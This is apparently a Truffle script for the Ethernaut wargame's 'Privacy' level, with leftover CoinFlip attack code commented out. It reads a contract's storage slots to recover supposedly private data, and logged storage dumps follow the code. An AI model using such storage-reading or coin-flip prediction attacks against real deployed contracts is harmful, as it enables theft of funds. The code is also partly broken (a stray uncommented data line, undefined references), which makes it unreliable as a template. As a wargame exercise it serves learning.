module.exports = function (callback) {
    const Privacy = artifacts.require("Privacy");
    //const CoinFlip = artifacts.require("CoinFlip");

    //ropsten
    //let attacker_address = "0x30c947301d4344091fac586c5dd1dba97385f5bb"
    //ganache
    let attacker_address = "0xd014958E18CE9f4Ae8d2eFfD131d692223360281"

    let lastBlock = 0;
    let coin_side = false;

    function transact(contractFunction, params) {
        CoinFlip.deployed().then(function (instance) {
            return instance[contractFunction](...params);
        }).then(function (result) {
            console.log(result);
        }).catch(function (e) {
            console.log("error: " + e);
            //error
        })
    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms)
        })
    }
    async function guess() {
        //ganache
        let instance = await Privacy.deployed();

        //ropsten
        //let vulnerable = await CoinFlip.at("0xd780f39c1bc867e35825e9a63d23a17072d7030d");

        let wins = await instance["Privacy"]('abcabcabcabc', {
            from: attacker_address
        });

        /* let wins = await transact("Privacy",(['abc',{
            from: attacker_address
        }])); */

        console.log(wins);
        /* while (wins < 60) {

            contract_bv = await instance["bv2"]({
                from: attacker_address
            });
            console.log("BH-2 contract base10?: " + contract_bv);

            contract_bv = await instance["bv1"]({
                from: attacker_address
            });
            console.log("BH-1 contract base10?: " + contract_bv);

            contract_side = await instance["side"]({
                from: attacker_address
            });
            console.log("\nguessing from side: " + contract_side);
            await web3.eth.getBlockNumber(function (error, result) {
                blockNumber = result;
            })
            console.log("Block we got side: " + blockNumber);
            await transact("flip", [contract_side,{
                from: attacker_address
            }]);
            await web3.eth.getBlockNumber(function (error, result) {
                blockNumber = result;
            })
            console.log("Block submitted: " + blockNumber);
            let flip_result = await vulnerable["flip"](contract_side, {
                from: attacker_address
            });
            console.log(flip_result);
            vulnerable["flip"](contract_side,{
                from: attacker_address
            });
               CoinFlip.deployed().then(function (instance) {
                   meta = instance;
                   return meta[contractFunction](...params);
               }).then(function (result) {
                   console.log(result);
               }).catch(function (e) {
                   console.log("error: " + e);
                   //error
               })
            //console.log(flip_result);
            await web3.eth.getBlockNumber(function (error, result) {
                blockNumber = result;
            })
            console.log("Block resolved: " + blockNumber);
            lastBlock = blockNumber;

            wins = await vulnerable["consecutiveWins"]({
                from: attacker_address
            });

            await web3.eth.getBlockNumber(function (error, result) {
                blockNumber = result;
            })

            console.log("wins: " + wins);
            console.log("Block Number: " + blockNumber);
            //await sleep(2000);

            //This is where we wait for the next block before making a new transaction
            console.log("Waiting for next block");
             while (lastBlock == blockNumber) {
                 await web3.eth.getBlockNumber(function (error, result) {
                     blockNumber = result;
                 })
                 await sleep(100);
             }
        } */
    }

    async function getStore(index, address) {
        if (address == undefined){
            let instance = await Privacy.deployed();
            address = instance.address;
        }
        
        web3.eth.getStorageAt(address, index,
            function (err, count) {
                if (count != "0x0000000000000000000000000000000000000000000000000000000000000000"){
                    console.log("At index " + index + ": " + count);
                }
            });
    }

    //A ropsten Privacy contract by remix
    let remix = "0x9a106d4a612645b710d7032d7db50a5fa782d353";
    //["0x3984723947","0x239479283498","0x34823428"]
    //["0x616263646566676869","0x616263646566676869","0x616263646566676869"]
    //["0x616263646566676869","0x616263646566676869","0x63"]
    //0xdd75274895fdf54f6d49db8050428b7875928bd2, 79256, 0x6162000000000000
    0x138c9dff6d278695d4c766c70955c0d5f94111f7, 163841, 0x6162000000000000
    
    
    //ethernaut contract
    let ethernaut = "0xf9c9174daab0a96f594f3c798ac301fc57844a6b";

    for (i = 0; i < 200; i++) {
        getStore(i,remix,"latest");
    }
    //guess();
}

//first time ganache
/* Current count: 0x0fc38589085b52fa5b31e601b32450043ddfac13
Current count: 0x02
Current count: 0x00
Current count: 0x00
Current count: 0x00
Current count: 0x00
Current count: 0x00
Current count: 0x00 */


//first time, ropstein network ethernaut
/* Current count: 0xe68de411936911bfabfb3398fb04500838883ac7db5783fa5f95d25a6a617c85
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x00000000000000000000000000000000000000000000000000000057ddff0a01
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x127c3dbb843c9101b4ba1cc1f16d22d3479a0d24693ca42bb07349f03b25d245
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0xef1e4962e514c5e9f35d91932d31d3a501934fe1e7ec99ebcacdf32f5b27ad2a
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000 */


//second time ropstein network ethernaut
/* Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x127c3dbb843c9101b4ba1cc1f16d22d3479a0d24693ca42bb07349f03b25d245
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0xef1e4962e514c5e9f35d91932d31d3a501934fe1e7ec99ebcacdf32f5b27ad2a
Current count: 0x0000000000000000000000000000000000000000000000000000006780ff0a01
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0xe68de411936911bfabfb3398fb04500838883ac7db5783fa5f95d25a6a617c85
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000
Current count: 0x0000000000000000000000000000000000000000000000000000000000000000 */

